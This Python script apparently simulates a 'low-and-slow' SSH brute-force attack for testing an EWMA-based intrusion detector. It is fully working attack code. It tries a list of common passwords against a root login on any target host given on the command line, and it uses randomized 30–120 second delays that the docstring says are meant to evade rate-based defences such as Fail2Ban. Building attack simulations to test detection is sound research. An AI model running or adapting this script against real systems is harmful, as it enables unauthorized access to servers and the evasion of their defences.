"""
Scenario 3: Low-and-Slow SSH Brute-Force Simulation

Simulates a stealthy brute-force with randomized delays (30-120s)
designed to evade rate-based detection systems like standard Fail2Ban.

This is the KEY scenario for demonstrating the dynamic threshold's
early prediction capability.

Usage:
    python slow_brute_force.py --target 192.168.1.100 --min-delay 30 --max-delay 120
"""

import argparse
import random
import time
import logging
from datetime import datetime

try:
    import paramiko
except ImportError:
    import sys
    print("Install paramiko: pip install paramiko")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

PASSWORDS = [
    'password', '123456', 'root', 'admin', 'toor', 'password123',
    'qwerty', 'letmein', 'welcome', 'monkey', '12345', 'abc123',
    'dragon', 'master', 'login', 'passw0rd', 'shadow', 'trustno1',
    'iloveyou', '000000', 'access', 'hello', 'charlie', 'test',
]


def run_slow_brute_force(
    target: str,
    port: int = 22,
    username: str = 'root',
    min_delay: int = 30,
    max_delay: int = 120,
    max_attempts: int = 24,
):
    """Run low-and-slow brute-force simulation.

    This attack attempts to stay under the radar by:
    1. Using long, randomized delays between attempts
    2. Single attempt per "session" (no retries within connection)
    3. Jittered timing to avoid periodic detection

    The dynamic threshold should still detect this because:
    - EWMA accumulates suspicious scores over time
    - Even moderate anomaly scores from repeated failures
      will push the EWMA above the early warning threshold
    """
    logger.info(f"=== Low-and-Slow Brute-Force Simulation ===")
    logger.info(f"Target: {target}:{port}")
    logger.info(f"Username: {username}")
    logger.info(f"Delay range: {min_delay}-{max_delay}s (randomized)")
    logger.info(f"Max attempts: {max_attempts}")
    logger.info(f"Estimated duration: {min_delay * max_attempts // 60}-{max_delay * max_attempts // 60} minutes")
    logger.info(f"Starting at: {datetime.now().isoformat()}")
    logger.info(f"{'='*60}")

    for i, password in enumerate(PASSWORDS[:max_attempts]):
        # Random delay with jitter
        delay = random.uniform(min_delay, max_delay)

        logger.info(f"[{i+1}/{max_attempts}] Attempting: {username}:{password}")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=target, port=port,
                username=username, password=password,
                timeout=5, look_for_keys=False, allow_agent=False,
            )
            logger.warning(f"SUCCESS! Password: {password}")
            client.close()
            return
        except paramiko.AuthenticationException:
            logger.info(f"  -> Failed. Next attempt in {delay:.1f}s")
        except Exception as e:
            logger.info(f"  -> Error: {e}. Next attempt in {delay:.1f}s")
        finally:
            client.close()

        if i < max_attempts - 1:
            time.sleep(delay)

    logger.info(f"Slow attack completed. No password found.")
    logger.info(f"Finished at: {datetime.now().isoformat()}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Low-and-Slow SSH Brute-Force')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=22)
    parser.add_argument('--username', default='root')
    parser.add_argument('--min-delay', type=int, default=30)
    parser.add_argument('--max-delay', type=int, default=120)
    parser.add_argument('--max-attempts', type=int, default=24)
    args = parser.parse_args()

    run_slow_brute_force(
        target=args.target, port=args.port, username=args.username,
        min_delay=args.min_delay, max_delay=args.max_delay,
        max_attempts=args.max_attempts,
    )
